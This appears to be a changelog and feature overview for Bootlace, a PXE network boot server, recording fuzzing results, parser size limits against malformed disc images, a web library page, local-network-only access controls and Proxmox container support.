- **Fuzzing, first pass (audit #34).** Go fuzz tests for the boot-menu readers (isolinux, GRUB, systemd-boot: 35 million inputs), for the iPXE menu script (names and titles can never add a line to it: 1.2 million inputs) and for the ISO, UDF, FAT and partition readers (needs seed images, see `internal/disc/fuzz_test.go`). The first run found one thing: a carriage return inside a menu line could end up inside a kernel path of an iPXE script; such an entry is no longer offered and the arguments of an entry lose control characters. Run them with `go test ./internal/bootcfg -run xxx -fuzz FuzzParse -fuzztime 60s` (and the same for `internal/menu`).
- **ISO 9660 reader: a folder can no longer be bigger than the image (audit #34, found by fuzzing).** The root folder of a 98 KB test image said it was 2 GB long and the reader made a buffer of that size before noticing that the image ends earlier (seconds of time and, with a few such folders, the memory of the computer). Folders are now limited to 64 MB and to what the image holds, and so is a Rock Ridge continuation area. The fuzz test for the ISO, UDF, FAT and partition readers starts from two real seed images (a UDF one and an ISO 9660 one).
- **More limits on what hostile files can ask for (audit #34).** The UDF reader (folders and descriptor areas), the FAT reader (a folder's chain of clusters) and the initramfs reader (a file name of up to 4 GB in a cpio header) now refuse sizes that no real file has (64 MB for a folder or an area, 4096 characters for a name) instead of making a buffer of the size the file claims. Found by reading the readers for `make([]byte, <number from the file>)` after the fuzzer found the same fault in the ISO 9660 reader.

(#11)

A share is mounted on the host with an automount, so it does not matter whether the NAS starts before or after the container; the container follows it, and Bootlace waits for it. Tested on Proxmox VE 9.2, including a hard NFS mount that disappears and comes back. (#11)

- **Library page.** Upload files, add a file from a web address, rename, move, make folders and delete, all in the web interface. A file is written to disk as it arrives and only put in place when it is whole; its first bytes are checked against its name; an optional SHA-256 or SHA-512 is verified; the same name, address, size or content is noticed before and after; nothing is ever replaced. Downloads are fetched by the server with a client that refuses local addresses at the moment it connects, resume after an interruption or a restart, and slow down while PCs are installing (a setting). Deleting is never recursive. The settings of an ISO follow it when it is renamed or moved. (#20)
- **Cache in two places.** Unpacked images and the copies of boot.wim go to the container's own small cache folder while it has room and then to `<library>/.bootlace/cache`; the size and the choice are settings on the Server page. (#20)
- **The login slides.** It lasts while something is done in the page (a transfer in progress counts, the page refreshing itself does not), ends after 30 quiet minutes, and never lasts longer than 12 hours.
- **Local network only.** Every service (web page and menu, Windows share, iSCSI, network disk, TFTP, DHCP) now refuses addresses that are not local (private ranges, loopback, link-local). More networks, or "from anywhere" with a confirmation, are set under Server in the web interface; refusals are counted there, and a public server address gives a warning. (#38)
- The ISO folder is now a **library**, chosen in the web interface (Server page, with a folder picker). It must be readable and writable and is recognised by a marker in its `.bootlace` folder: a missing network drive is never mistaken for it, and nothing is served or written then. `-iso-dir` only adds the library on the first start. (#36)
- The services PCs talk to can be started and stopped in the web interface, with a warning when PCs are connected; a port that is already taken is reported there instead of ending the program. The server stops after 30 seconds without the library and starts again by itself when it is back. (#36)
- Hidden folders and files (`.bootlace`, `._name.iso`) are never offered as ISOs.
- The Proxmox script now mounts the ISO folder read and write, and says what to do when the container cannot write to it.

What the program does:

- PXE network boot server in one program: proxy DHCP, TFTP, a web server, a network disk (NBD) server, an iSCSI target and a Windows file share, with iPXE for
  BIOS and UEFI built in.
- A boot menu made from a folder of ISO files and disk images (also packed `.xz`, `.gz`, `.zst`, `.bz2` and `.zip`); the files are never changed.
- Ubuntu, Debian, Fedora and relatives, Arch, openSUSE, Alpine, Proxmox VE, Tails, Windows (also with Secure Boot on), FreeBSD and many more start by name; other live
  ISOs are recognised from their own boot menus. Results per ISO: [docs/compatibility.md](docs/compatibility.md).
- A web interface to see the PCs, hide or rename ISOs, give a PC a rule, and read the log.
- A script that makes a Proxmox container with the server in it.
